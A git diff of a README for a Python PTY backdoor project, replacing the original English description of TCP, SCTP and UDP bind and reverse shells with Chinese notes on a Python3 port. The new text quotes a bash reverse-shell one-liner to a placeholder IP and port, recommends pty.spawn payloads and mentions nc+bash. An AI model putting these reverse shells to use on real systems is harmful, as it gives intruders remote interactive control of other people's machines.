@@ -1,22 +1,16 @@
-python-pty-shells
+Python3-pty-shells
 =================
 
-Python PTY backdoors - full PTY or nothing!
+这是一个八九年前的项目，但是这是用Python2写的，如今他已经无法兼容Python3，而如今连Ubuntu的最新版都默认预装Python3，要使用Python2还得另外安装，所以我把它修改了一下以便兼容Python3，不得不说这个项目非常的强，使用它得到的shell和本地的bash没有任何区别，你可以使用CTRL+C，CTRL+Z和CTRL+D，并且可以使用vi、nano等会阻塞当前终端的命令
 
-Insecurety Research (2013)
+不过你最好使用的Payload是Python写的，而不是最常用的bash一句话：bash -i >& /dev/tcp/**IP**/**PORT** 0>&1，如果你使用bash，会导致功能不完全，比如在bash回连的情况下，当你使用Ping命令时，会导致shell阻塞，这时你使用Ctrl+C都无济于事，不过还是可以使用nano和vi等命令。
 
-The following is a collection of bind and reverse shells which give you a fully working PTY.
+二来使用Python的Payload的话，最好使用pty.spawn("/bin/bash")而不是subprocess.call或者其他
 
-This is far superior to a normal bind or reverse shell, as you have job control and an interactive PTY and can do such things as use nano/vi to write files, su to elevate privs/change user, and ssh onward. You can also CTRL+C  and suchlike. 
 
-I have implemented the bind and backconnect shells using the TCP protocol, the SCTP protocol, and the UDP protocol.
 
-A demonstration video and blog post explaining the advantages/disadvantages of each technique is on the way, I just need to get around to it. 
+第三，如果你懒得折腾，那还是使用nc+bash吧
 
-For the SCTP shell, you will need the PySCTP module and the host will need to support the SCTP protocol. Most modern Linux boxes do, however you may need to install lksctp and lksctp-dev to build the python extensions. I am unsure if pyinstaller or similar can get around this.
 
-Released under the WTFPL - wtfpl.net
 
-Project by Insecurety Research - insecurety.net
-
-Author: Darren 'infodox' Martyn.
+作者项目地址：https://github.com/infodox/python-pty-shells
